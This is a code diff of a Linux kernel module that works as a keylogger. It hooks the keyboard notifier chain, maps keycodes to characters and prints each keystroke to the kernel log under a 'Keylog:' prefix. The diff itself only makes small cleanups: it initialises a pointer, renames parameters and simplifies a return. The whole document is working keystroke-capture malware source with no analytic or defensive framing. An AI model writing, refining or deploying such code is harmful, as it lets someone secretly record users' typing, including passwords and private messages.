@@ -39,7 +39,7 @@ static const char *mass_of_key[][2] = { {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", 
 void func_transf_code(void *_param, char *buffer, unsigned int size_buff){
 	struct keyboard_notifier_param *param = _param;
 	if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE){
-		char *key;
+		char *key = NULL;
 		if (param->shift == 1){
 			key = mass_of_key[param->value][1];
 		}
@@ -50,7 +50,7 @@ void func_transf_code(void *_param, char *buffer, unsigned int size_buff){
 	}
 }
 
-static int keyboard_notifier_call(struct notifier_block *blk, unsigned long code, void *_param)
+static int keyboard_notifier_call(struct notifier_block *nb, unsigned long action, void *_param)
 {
 	struct keyboard_notifier_param *param = _param;
 	int ret = NOTIFY_OK;
@@ -61,7 +61,7 @@ static int keyboard_notifier_call(struct notifier_block *blk, unsigned long code
 	func_transf_code(_param, keybuffer, 12);
 	printk(KERN_INFO "Keylog: %s", keybuffer);
 
-	if (strlen(keybuffer) < 1) return NOTIFY_OK;
+	if (strlen(keybuffer) < 1) return ret;
 	return ret;	
 }
 
